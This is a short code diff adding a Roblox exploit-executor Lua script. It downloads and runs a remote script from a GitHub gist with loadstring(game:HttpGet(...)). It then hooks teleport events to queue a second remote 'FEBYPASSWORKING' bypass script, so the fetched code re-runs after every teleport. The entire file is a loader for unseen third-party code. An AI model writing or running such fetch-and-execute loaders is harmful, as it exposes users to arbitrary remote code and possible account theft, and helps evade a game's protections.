@@ -1,0 +1,11 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/kequask/04595da9cb8b55ac9d91448e30671ff8/raw/ac70f4b180bed7ab111cdf6b989c9c0abe1629e9/chlenus.lua",true))()
+
+queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport
+
+local shoutouttofemboysfrlgottabeoneofmyfavoritegenders = false
+game.Players.LocalPlayer.OnTeleport:Connect(function()
+    if queueteleport and (not shoutouttofemboysfrlgottabeoneofmyfavoritegenders) then
+        shoutouttofemboysfrlgottabeoneofmyfavoritegenders = true
+        queueteleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/Err404674/Projects/refs/heads/main/Useless/FEBYPASSWORKING",true))()')
+    end
+end)
